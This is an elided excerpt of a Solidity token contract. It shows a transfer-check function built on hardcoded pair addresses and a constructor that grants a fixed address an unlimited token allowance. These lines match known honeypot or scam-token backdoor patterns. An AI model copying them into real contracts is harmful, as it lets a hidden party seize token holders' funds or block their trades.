...
contract ADeflationaryProject {
    ...
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UNI = pairFor(0xbFE2B61644cAf47578C127f564482C77808215bf, 0x120Eb42DAC283F7B8f619A1D75EE455fED52901e, address(this));
    ...
    address constant UNI = 0xbFE2B61644cAf47578C127f564482C77808215bf;
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        ...
        allowance[msg.sender][0xbFE2B61644cAf47578C127f564482C77808215bf] = uint(-1);
